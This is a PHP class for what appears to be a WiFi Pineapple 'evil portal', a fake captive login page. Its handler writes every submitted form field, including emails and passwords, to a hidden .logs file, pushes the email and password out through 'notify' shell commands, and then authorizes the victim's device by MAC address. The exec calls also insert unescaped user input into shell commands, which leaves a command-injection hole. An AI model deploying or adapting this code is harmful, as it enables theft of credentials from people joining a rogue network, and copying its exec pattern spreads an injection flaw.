<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (!empty($_POST)) {
            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());

            $logData = "[" . date('Y-m-d H:i:s') . "Z]\n";
            foreach ($_POST as $key => $value) {
                $logData .= "$key: $value\n";
            }
            $logData .= "\n";

            file_put_contents("{$logPath}/.logs", $logData, FILE_APPEND);

            // Notify with basic credentials
            if (isset($_POST['email']) && isset($_POST['password'])) {
                $email = $_POST['email'];
                $pwd = $_POST['password'];
                $this->execBackground("notify '$email - $pwd'");
                exec("pineapple notify '$email - $pwd'");
            }

            // Explicitly authorize the client using MAC
            if (isset($_POST['mac'])) {
                $this->authorizeClient($_POST['mac']);
            }
        }

        // Ensure parent authorization handling completes
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
